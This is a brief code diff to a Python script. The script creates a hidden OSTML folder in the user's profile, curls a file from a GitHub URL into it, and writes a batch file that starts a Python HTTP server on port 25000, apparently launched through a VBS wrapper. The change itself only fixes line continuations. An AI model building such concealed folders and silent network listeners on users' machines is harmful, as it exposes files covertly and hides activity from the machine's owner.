@@ -10,8 +10,8 @@ os.system("attrib +h OSTML")
 os.chdir(f"C:/Users/{user}/OSTML/")
 os.system("curl -o prac.txt https://raw.githubusercontent.com/darwin08-os/Temp/main/prac.txt")
 
-bat_content = f'''@echo off \
-cd "C:/Users/{user}/OSTML/" \
+bat_content = f'''@echo off
+cd "C:/Users/{user}/OSTML/"
 "{sys.executable}" -m http.server 25000'''
 
 vbs_content = fr'''
